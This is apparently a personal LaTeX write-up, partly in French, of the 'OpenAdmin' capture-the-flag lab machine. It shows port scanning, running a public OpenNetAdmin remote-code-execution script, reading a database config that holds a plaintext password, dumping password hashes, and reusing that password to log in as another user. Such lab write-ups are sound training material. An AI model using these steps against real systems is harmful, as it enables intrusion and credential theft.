\chapter{OpenAdmin}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Recon}
\subsection{nmap}
\begin{verbatim}
$ nmapz 10.10.10.171
TCP ports found: 22,80
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-19 01:02 CET
Nmap scan report for 10.10.10.171
Host is up (0.031s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b98df85d17ef03dda48cdbc9200b754 (RSA)
|   256 dceb3dc944d118b122b4cfdebd6c7a54 (ECDSA)
|_  256 dcadca3c11315b6fe6a489347c9be550 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\end{verbatim}


on a trois folders 
\begin{verbatim}
sierra
artwork
music
\end{verbatim}



en login on a 
\begin{verbatim}
http://10.10.10.171/ona/


$ curl -I http://10.10.10.171/ona/
HTTP/1.1 200 OK
Date: Sun, 19 Mar 2023 00:47:21 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: ona_context_name=DEFAULT
Set-Cookie: ONA_SESSION_ID=4jojgla8riufhbualdugih7rt7; path=/
Cache-control: private
Content-Type: text/html; charset=UTF-8
\end{verbatim}


\begin{verbatim}
$ searchsploit opennetadmin
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                          | php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)           | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                            | php/webapps/47691.sh
----------------------------------------------------------------------- ---------------------------------
\end{verbatim}



\begin{verbatim}

$ bash 47691.sh http://openadmin.htb/ona/
$ ls
config
config_dnld.php
dcm.php
images
include
index.php
local
login.php
logout.php
modules
plugins
winc
workspace_plugins
$


$ cat /opt/ona/www/local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 =>
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

\end{verbatim}


\begin{verbatim}
* from users
    -> ;
;
+----+----------+----------------------------------+-------+---------------------+---------------------+
| id | username | password                         | level | ctime               | atime               |
+----+----------+----------------------------------+-------+---------------------+---------------------+
|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2023-03-19 02:13:10 | 2023-03-19 02:13:10 |
|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2007-10-30 03:00:17 | 2007-12-02 22:10:26 |
+----+----------+----------------------------------+-------+---------------------+---------------------+
2 rows in set (0.00 sec)

\end{verbatim}

ca donne admin et test :(

\begin{verbatim}
www-data@openadmin:/$ su jimmy
su jimmy
Password: n1nj4W4rri0R!

jimmy@openadmin:/$

\end{verbatim}



